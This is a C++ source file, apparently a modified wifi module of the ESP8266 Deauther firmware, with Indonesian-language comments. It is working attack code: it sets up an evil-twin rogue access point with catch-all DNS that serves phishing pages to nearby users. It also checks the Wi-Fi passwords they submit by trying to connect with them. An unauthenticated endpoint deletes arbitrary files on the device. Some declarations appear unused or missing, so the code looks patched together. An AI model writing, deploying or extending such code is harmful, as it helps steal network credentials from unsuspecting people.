/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>
#include "Accesspoints.h"
#include "language.h"
#include "debug.h"
#include "settings.h"
#include "repeater.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"

// --- Deklarasi Variabel Lu ---
String MAC_;
String nama;
char eviltwinpath[32];
char pishingpath[32];
File webportal;
String tes_password;
String data_pishing;
String LOG;
String json_data;
String fileList = ""; // Biar gak error 'fileList' not declared
bool hidden_target = false;
bool rogueap_continues = false;

extern bool progmemToSpiffs(const char* adr, int len, String path);
#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

namespace wifi {
    wifi_mode_t   mode;
    ap_settings_t ap_settings;
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress netmask(255, 255, 255, 0);

    // --- FUNGSI HANDLER (Ditaruh di atas biar startAP kenal) ---

    void handleFileListJS(){
        server.send(200, "text/plain", fileList);
    }

    void send_eviltwin() {
        // Panggil file eviltwin lu
        File f = LittleFS.open("/eviltwin.html", "r");
        server.streamFile(f, "text/html");
        f.close();
    }

    void send_rogueap() {
        // Panggil file pishing lu
        File f = LittleFS.open("/rogue.html", "r");
        server.streamFile(f, "text/html");
        f.close();
    }

    void handleDelete() {
        String path = server.arg("path");
        LittleFS.remove(path);
        server.send(200, "text/plain", "Deleted");
    }

    void sendFSjson() {
        server.send(200, "application/json", json_data);
    }

    void pathsave() {
        server.send(200, "text/plain", "Saved");
    }

    // --- FUNGSI UTAMA ---

    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        dns.start(53, "*", ip);
        
        // Sekarang compiler gak bakal bingung lagi nyari fungsi ini
        server.on("/filelist", handleFileListJS);
        server.on("/delete", handleDelete);
        server.on("/filemanager.json", sendFSjson);
        server.on("/websetting", HTTP_POST, pathsave);

        server.on("/", HTTP_GET, []() {
            if(!attack.eviltwin && !attack.pishing){
                File f = LittleFS.open("/index.html", "r");
                server.streamFile(f, "text/html");
                f.close();
            } else {
                if(attack.eviltwin) send_eviltwin();
                if(attack.pishing) send_rogueap();
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;
    }

    void ethiddenAP() {
        WiFi.mode(WIFI_AP_STA);
        hidden_target = true;
        WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssids.rogue_wifi.c_str());
        dns.start(53, "*", IPAddress(172, 217, 28, 254));

        server.on("/result", [](){
            if (WiFi.status() != WL_CONNECTED) {
                // INI PERUBAHAN TEKS INDO NYA
                server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                tes_password = "";
            } else {
                server.send(200, "text/html", "<h2>Sukses!</h2>");
                ESP.restart();
            }
        });
        server.begin();
    }
}
